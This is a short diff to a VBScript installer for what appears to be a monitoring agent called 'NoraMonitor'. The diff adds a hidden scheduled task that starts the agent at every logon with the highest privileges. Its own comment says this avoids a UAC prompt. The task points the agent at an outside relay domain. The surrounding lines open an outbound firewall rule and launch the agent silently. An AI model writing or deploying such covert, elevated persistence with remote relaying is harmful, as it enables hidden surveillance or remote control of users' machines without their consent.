@@ -52,7 +52,13 @@ If pyw <> "" Then
     sh.Run "cmd /c netsh advfirewall firewall add rule name=""Python Monitor"" dir=out action=allow program=""" & pyw & """ enable=yes profile=any", 0, True
 End If
 
-' ── Launch agent (no console window) ─────────────────────────────────────────
+' ── Register auto-start via Task Scheduler (elevated at login, no UAC popup) ──
+Dim taskCmd
+taskCmd = "cmd /c set NORA_RELAY=https://mon.eclipselivecam.online & cd /d """ & DIR & """ & pythonw """ & DIR & "\app.py"""
+sh.Run "schtasks /delete /tn ""NoraMonitor"" /f", 0, True
+sh.Run "schtasks /create /tn ""NoraMonitor"" /tr """ & taskCmd & """ /sc onlogon /rl highest /f", 0, True
+
+' ── Launch agent now (first run, no console window) ───────────────────────────
 sh.Environment("Process")("NORA_RELAY") = "https://mon.eclipselivecam.online"
 sh.Run "cmd /c start """" /D """ & DIR & """ pythonw """ & DIR & "\app.py""", 0, False
 
